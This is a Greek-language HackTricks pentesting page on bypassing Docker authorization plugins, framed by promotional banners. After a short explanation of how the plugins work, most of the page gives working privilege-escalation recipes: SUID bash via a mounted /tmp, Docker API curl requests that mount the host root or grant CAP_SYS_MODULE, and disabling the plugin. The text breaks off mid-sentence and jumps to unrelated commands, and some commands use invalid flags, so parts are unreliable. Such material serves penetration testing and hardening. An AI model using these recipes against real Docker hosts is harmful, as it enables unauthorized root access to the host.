<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


Το προεπιλεγμένο μοντέλο **εξουσιοδότησης** του Docker είναι **όλα ή τίποτα**. Οποιοσδήποτε χρήστης με άδεια πρόσβασης στον Docker daemon μπορεί να εκτελέσει οποιαδήποτε εντολή πελάτη Docker. Το ίδιο ισχύει για τους καλούντες που χρησιμοποιούν το Engine API του Docker για να επικοινωνήσουν με τον daemon. Εάν χρειάζεστε **μεγαλύτερο έλεγχο πρόσβασης**, μπορείτε να δημιουργήσετε **πρόσθετα εξουσιοδότησης** και να τα προσθέσετε στη διαμόρφωση του Docker daemon. Χρησιμοποιώντας ένα πρόσθετο εξουσιοδότησης, ένας διαχειριστής Docker μπορεί να **διαμορφώσει λεπτομερείς πολιτικές πρόσβασης** για τη διαχείριση της πρόσβασης στον Docker daemon.

# Βασική αρχιτεκτονική

Τα πρόσθετα εξουσιοδότησης του Docker είναι **εξωτερικά πρόσθετα** που μπορείτε να χρησιμοποιήσετε για να **επιτρέψετε/απαγορεύσετε** **ενέργειες** που ζητούνται από τον Docker Daemon ανάλογα με τον χρήστη που το ζήτησε και την ενέργεια που ζητήθηκε.

**[Οι παρακάτω πληροφορίες προέρχονται από τα έγγραφα](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Όταν γίνεται μια **HTTP** αίτηση στον Docker **daemon** μέσω του CLI ή μέσω του Engine API, το **υποσύστημα πιστοποίησης** περνά την αίτηση στο εγκατεστημένο **πρόσθετο πιστοποίησης**. Η αίτηση περιέχει τον χρήστη (καλούντα) και το πλαίσιο εντολών. Το πρόσθετο είναι υπεύθυνο για τον καθορισμό εάν θα επιτρέψει ή θα απορρίψει την αίτηση.

Τα παρακάτω διαγράμματα ακολουθούν τη ροή εξουσιοδότησης για την επιτρεπτή και την απορριπτική ροή:

![Ροή επιτρεπτής εξουσιοδότησης](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Ροή απορριπτικής εξουσιοδότησης](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Κάθε αίτηση που στέλνεται στο πρόσθετο **περιλαμβάνει τον εξουσιοδοτημένο χρήστη, τις κεφαλίδες HTTP και το σώμα της αίτησης/απόκρισης**. Μόνο το **όνομα χρήστη** και η **μέθοδος πιστοποίησης** που χρησιμοποιήθηκε περνιούνται στο πρόσθετο. Το πιο σημαντικό, **δεν περνιούνται διαπιστευτήρια χρήστη ή διακριτικά**. Τέλος, **δεν όλα τα σώματα αιτήσεων/αποκρίσεων αποστέλλονται** στο πρόσθετο εξουσιοδότησης. Αποστέλλονται μόνο εκείνα τα σώματα αιτήσεων/αποκρίσεων όπου το `Content-Type` είναι είτε `text/*` είτε `application/json`.

Για εντολές που μπορούν πιθανώς να καταλάβουν τη σύνδεση HTTP (`HTTP Upgrade`), όπως η `exec`, το πρόσθετο εξουσιοδότησης καλείται μόνο για τις αρχικές αιτήσεις HTTP. Αφού το πρόσθετο εγκρίνει την εντολή, η εξουσιοδότηση δεν εφαρμόζεται στο υπόλοιπο της ροής. Ειδικότερα, τα δεδομένα ροής δεν περνι
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Εκτέλεση ενός container και στη συνέχεια απόκτηση προνομιούχου συνεδρίας

Σε αυτήν την περίπτωση, ο συστημικός διαχειριστής **απαγόρευσε στους χρήστες να τοποθετούν όγκους και να εκτελούν containers με την παράμετρο `--privileged` ή να παρέχουν οποιαδήποτε επιπλέον δυνατότητα στο container**:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Ωστόσο, ένας χρήστης μπορεί να **δημιουργήσει ένα κέλυφος μέσα στο εκτελούμενο container και να του δώσει επιπλέον προνόμια**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Τώρα, ο χρήστης μπορεί να δραπετεύσει από το container χρησιμοποιώντας οποιαδήποτε από τις [**προηγουμένως συζητηθείσες τεχνικές**](./#privileged-flag) και να **αναβαθμίσει τα δικαιώματα** μέσα στον host.

## Προσάρτηση εγγράψιμου φακέλου

Σε αυτήν την περίπτωση, ο συστημικός διαχειριστής **απαγόρευσε στους χρήστες να εκτελούν containers με την σημαία `--privileged`** ή να δίνουν οποιαδήποτε επιπλέον δυνατότητα στο container, και επέτρεψε μόνο την προσάρτηση του φακέλου `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Σημείωση ότι ίσως δεν μπορείτε να προσαρτήσετε τον φάκελο `/tmp` αλλά μπορείτε να προσαρτήσετε έναν **διαφορετικό εγγράψιμο φάκελο**. Μπορείτε να βρείτε εγγράψιμους φακέλους χρησιμοποιώντας: `find / -writable -type d 2>/dev/null`

**Σημειώστε ότι όχι όλοι οι φάκελοι σε ένα μηχάνημα Linux θα υποστηρίζουν το suid bit!** Για να ελέγξετε ποιοι φάκελοι υποστηρίζουν το suid bit, εκτελέστε `mount | grep -v "nosuid"` Για παράδειγμα, συνήθως οι φάκελοι `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` και `/var/lib/lxcfs` δεν υποστηρίζουν το suid bit.

Σημειώστε επίσης ότι αν μπορείτε να **προσαρτήσετε τον φάκελο `/etc`** ή οποιονδήποτε άλλο φάκελο **περιέχει αρχεία ρυθμίσεων**, μπορείτε να τα τροποποιήσετε από το docker container ως root για να **καταχραστείτε τα δικαιώματα** στον κεντρικό υπολογιστή (ίσως τροποποιώντας το `/etc/shadow`)
{% endhint %}

## Μη ελεγμένο API Endpoint

Η ευθύνη του συστημικού διαχειριστή που ρυθμίζει αυτό το πρόσθετο θα ήταν να ελέγξει ποιες ενέργειες και με ποια δικαιώματα μπορεί να εκτελέσει κάθε χρήστης. Επομένως, αν ο διαχειριστής ακολουθήσει μια προσέγγιση **μαύρης λίστας** με τα σημεία πρόσβασης και τα χαρακτηριστικά, μπορεί να **ξεχάσει κάποια από αυτά** που θα μπορούσαν να επιτρέψουν σε έναν επιτιθέμενο να **αναβαθμίσει τα δικαιώματά του**.

Μπορείτε να ελέγξετε το API του docker στο [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Μη ελεγμένη δομή JSON

### Binds στον root

Είναι δυνατόν όταν ο συστημικός διαχειριστής ρύθμισε το τείχος προστασίας του docker να **ξέχασε κάποιο σημαντικό παράμετρο** του [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) όπως το "**Binds**".\
Στο παρακάτω παράδειγμα είναι δυνατόν να καταχραστείτε αυτήν την εσφαλμένη ρύθμιση για να δημιουργήσετε και να εκτελέσετε ένα container που προσαρτά τον root (/) φάκελο του κεντρικού υπολογιστή:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Σημείωση: Παρατηρήστε ότι σε αυτό το παράδειγμα χρησιμοποιούμε την παράμετρο **`Binds`** ως ένα κλειδί στο επίπεδο ρίζας στο JSON, αλλά στο API εμφανίζεται υπό το κλειδί **`HostConfig`**.
{% endhint %}

### Binds στο HostConfig

Ακολουθήστε τις ίδιες οδηγίες με το **Binds στο root**, εκτελώντας αυτό το **αίτημα** στο Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Συνδέσεις στον ριζικό φάκελο

Ακολουθήστε τις ίδιες οδηγίες με τις **Συνδέσεις στον ριζικό φάκελο** εκτελώντας αυτό το **αίτημα** στο Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Συναρμολογήσεις στο HostConfig

Ακολουθήστε τις ίδιες οδηγίες με τις **Συνδέσεις στη ρίζα** εκτελώντας αυτό το **αίτημα** στο Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Μη ελεγμένο JSON Χαρακτηριστικό

Είναι δυνατόν όταν ο συστημικός διαχειριστής ρύθμισε το τείχος ασφαλείας του Docker να **ξέχασε κάποιο σημαντικό χαρακτηριστικό ενός παραμέτρου** του [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) όπως το "**Capabilities**" μέσα στο "**HostConfig**". Στο παρακάτω παράδειγμα είναι δυνατόν να εκμεταλλευτείτε αυτήν την εσφαλμένη ρύθμιση για να δημιουργήσετε και να εκτελέσετε έναν container με τη δυνατότητα **SYS\_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
Το **`HostConfig`** είναι το κλειδί που συνήθως περιέχει τα **ενδιαφέροντα** **προνόμια** για να δραπετεύσετε από τον container. Ωστόσο, όπως έχουμε συζητήσει προηγουμένως, παρατηρήστε πώς η χρήση των Binds έξω από αυτό επίσης λειτουργεί και μπορεί να σας επιτρέψει να παρακάμψετε περιορισμούς.
{% endhint %}

## Απενεργοποίηση του Plugin

Αν ο **sysadmin** ξέχασε να **απαγορεύσει** τη δυνατότητα **απενεργοποίησης** του **plugin**, μπορείτε να εκμεταλλευτείτε αυτό για να το απενεργοποιήσετε εντελώς!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Θυμηθείτε να **επανενεργοποιήσετε το πρόσθετο μετά την ανόδο στα δικαιώματα**, διαφορετικά η **επανεκκίνηση της υπηρεσίας docker δεν θα λειτουργήσει**!

## Αναφορές για την παράκαμψη του πρόσθετου εξουσιοδότησης

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## Αναφορές

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
